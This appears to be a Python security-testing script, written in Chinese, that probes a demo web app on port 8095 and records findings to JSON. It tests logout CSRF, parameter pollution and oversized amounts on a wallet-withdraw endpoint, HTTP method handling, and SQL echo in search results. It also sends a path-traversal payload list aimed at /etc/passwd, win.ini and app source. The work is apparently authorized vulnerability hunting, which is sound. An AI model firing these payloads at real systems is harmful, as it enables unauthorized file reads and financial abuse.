"""t4-F：补充面——会话失效/登出、POST 体覆盖、边界金额、接口方法、8095 搜索信息面。"""
import json
import os
import importlib.util as ilu

HERE = os.path.dirname(os.path.abspath(__file__))
spec = ilu.spec_from_file_location("hunt_lib", os.path.join(HERE, "hunt-lib.py"))
lib = ilu.module_from_spec(spec)
spec.loader.exec_module(lib)

OUT = os.path.join(HERE, "hunt-f-extra-20261012-1900.json")
rec = []
res = []


def add(cat, title, detail, idxs, impact, verdict="见 detail", needs_verify=True,
        port=8095):
    res.append({"id": f"HUNT-F{len(res)+1}", "port": port, "category": cat,
                "title": title, "verdict": verdict, "evidence_indices": idxs,
                "detail": detail, "self_assessed_impact": impact,
                "needs_verifier": needs_verify})


ck = lib.get_cookie("demo", "demo123", record=rec)

# F1 GET /logout 无 CSRF
rows = []
k = lib.sent(rec, "GET", "/logout", headers={"Cookie": ck}, note="F1 GET /logout 无 CSRF")
rows.append({"step": "GET /logout", "status": lib.get_status(rec[k]), "idx": k,
             "location": [v for kk, v in rec[k]["response_headers"]
                          if kk.lower() == "location"]})
k2 = lib.sent(rec, "GET", "/home", headers={"Cookie": ck}, note="F1 登出后访问 /home")
rows.append({"step": "GET /home after logout", "status": lib.get_status(rec[k2]),
             "idx": k2, "len": rec[k2]["body_len"]})
add("CSRF/业务逻辑", "8095 GET /logout 无 CSRF：任意页面可强制登出（会话可用性攻击）",
    json.dumps(rows, ensure_ascii=False), [k, k2],
    "登出接口无 CSRF，<img src=/logout> 即可打断用户会话；危害等级低（拒绝服务式骚扰）",
    verdict="确认", port=8095)

# F2 query 覆盖 POST body（参数污染）
ck2 = lib.get_cookie("demo", "demo123", record=rec)
rows2 = []
k = lib.sent(rec, "POST", "/wallet/withdraw?amount=1",
             headers={"Cookie": ck2, "Content-Type": "application/x-www-form-urlencoded"},
             body="amount=999999", note="F2 POST body amount=999999 + query amount=1（覆盖验证）")
body1 = rec[k]["response_body"]
rows2.append({"case": "query 覆盖 body", "status": lib.get_status(rec[k]), "idx": k,
              "title": body1.split("<title>")[1].split("</title>")[0] if "<title>" in body1 else "",
              "snippet": lib.head_text(rec[k], 200)})
k2 = lib.sent(rec, "POST", "/wallet/withdraw",
              headers={"Cookie": ck2, "Content-Type": "application/x-www-form-urlencoded"},
              body="amount=1", note="F2 仅 body amount=1")
body2 = rec[k2]["response_body"]
rows2.append({"case": "仅 body", "status": lib.get_status(rec[k2]), "idx": k2,
              "title": body2.split("<title>")[1].split("</title>")[0] if "<title>" in body2 else "",
              "snippet": lib.head_text(rec[k2], 200)})
add("业务逻辑/参数污染", "8095 表单解析：query 参数覆盖 POST body（form() 中 data.update(q)），"
    "可用于绕过只校验 body 的前置逻辑",
    json.dumps(rows2, ensure_ascii=False), [k, k2],
    "同一参数两处出现时以 query 为准；当前各 handler 读取的是同一字典，暂未见直接绕过，"
    "但属反直觉解析顺序（需验证是否影响校验分支）", verdict="确认（解析行为）", port=8095)

# F3 超大 amount（int 无上限）与余额扣减
rows3 = []
for amt in ["9223372036854775807", "100000000000000000000000",
            str(2 ** 63), str(-(2 ** 63))]:
    k = lib.sent(rec, "GET", f"/wallet/withdraw?amount={amt}",
                 headers={"Cookie": ck2}, note=f"F3 amount={amt[:24]}")
    b = rec[k]["response_body"]
    rows3.append({"amount": amt[:24], "status": lib.get_status(rec[k]), "idx": k,
                  "title": b.split("<title>")[1].split("</title>")[0] if "<title>" in b else "",
                  "snippet": lib.head_text(rec[k], 200)})
add("业务逻辑/整数边界", "8095 提现金额无上限：int 任意大（SQLite INTEGER 溢出行为实测）",
    json.dumps(rows3, ensure_ascii=False), [x["idx"] for x in rows3],
    "金额参数无最大值校验；余额条件 WHERE balance_cents >= amount 阻止负余额，"
    "但超大整数在 SQLite 绑定为 Python int → 溢出 error 与否需看实测（见 detail）",
    verdict="确认（无上限校验）", port=8095)

# F4 方法矩阵（写接口用 POST/GET、DELETE 等）
rows4 = []
for m, p in [("POST", "/order/create"), ("POST", "/wallet/withdraw"),
             ("POST", "/coupon/claim"), ("GET", "/upload"), ("POST", "/board"),
             ("PUT", "/wallet/withdraw"), ("DELETE", "/board")]:
    k = lib.sent(rec, m, p, headers={"Cookie": ck2,
                                     "Content-Type": "application/x-www-form-urlencoded"},
                 body="" if m in ("POST", "PUT") else None,
                 note=f"F4 {m} {p}")
    rows4.append({"method": m, "path": p, "status": lib.get_status(rec[k]),
                  "idx": k, "snippet": lib.head_text(rec[k], 120)})
add("方法矩阵", "8095 写接口方法矩阵（GET/POST/PUT/DELETE 路径共存；方法语义不严格）",
    json.dumps(rows4, ensure_ascii=False), [x["idx"] for x in rows4],
    "GET 与 POST 均可达写逻辑（route() 不分方法）→ 触达方式扩大，CSRF 面随之扩大",
    verdict="确认", port=8095)

# F5 8095 搜索/接口信息泄露与 LIKE 通配
rows5 = []
for q in ["%", "_", "%25", "k"]:
    k = lib.sent(rec, "GET", "/api/search?q=" + q, note=f"F5 api/search q={q!r}")
    rows5.append({"q": q, "status": lib.get_status(rec[k]), "idx": k,
                  "results_len": rec[k]["body_len"],
                  "snippet": lib.head_text(rec[k], 220)})
add("信息泄露", "8095 /api/search 回显 SQL 模板字符串 + LIKE 通配符（q=% 与 q=_ 行为）",
    json.dumps(rows5, ensure_ascii=False), [x["idx"] for x in rows5],
    "响应体直接回显 SQL 语句（实现细节泄露）；LIKE 未转义通配符可全表匹配（信息面有限）",
    needs_verify=False, port=8095)

# F6 /download 白名单绕过尝试
rows6 = []
for f in ["readme.txt", "../app.py", "..%2fapp.py", "%2e%2e/app.py",
          "....//app.py", "C:\\Windows\\win.ini", "/etc/passwd",
          "readme.txt%00.py", "..\\app.py", "./readme.txt"]:
    k = lib.sent(rec, "GET", "/download?file=" + f, note=f"F6 download file={f!r}")
    rows6.append({"file": f, "status": lib.get_status(rec[k]), "idx": k,
                  "len": rec[k]["body_len"], "snippet": lib.head_text(rec[k], 120)})
add("路径穿越", "8095 /download?file= 路径穿越矩阵（10 组编码变体）",
    json.dumps(rows6, ensure_ascii=False), [x["idx"] for x in rows6],
    "若读到 downloads/ 之外文件即任意文件读", verdict="见 detail", port=8095)

with open(OUT, "w", encoding="utf-8") as fh:
    json.dump({"generated": lib.now(), "results": res, "raw_entries": rec}, fh,
              ensure_ascii=False, indent=1)
print("WROTE", OUT, "entries", len(rec))
for r in res:
    print("-", r["id"], "|", r["title"][:80])
